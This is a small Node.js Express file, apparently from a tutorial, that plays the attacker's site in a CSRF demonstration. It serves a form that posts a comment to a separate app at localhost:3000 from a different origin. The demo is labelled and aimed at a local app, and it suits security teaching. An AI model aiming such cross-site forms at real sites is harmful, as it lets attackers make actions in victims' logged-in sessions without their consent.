// an example of a CSRF attack
// this is the attacker's website

var express = require('express');
var bodyParser = require('body-parser');
var cookieParser = require('cookie-parser');
var app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

app.get('/', function(req, res) {
    res.send(`
    <html>
      <head>
        <title>Comments</title>
        </head>
        <body>
          <h1>Comments</h1>
          <form action="http://localhost:3000/comments" method="POST">
            <input  name="comment"></input >
            <button type="submit">Submit</button>
            </form>
            </body>
            </html>
            `);
});

app.listen(3001, function() {
    console.log('Listening on port 3001!');
});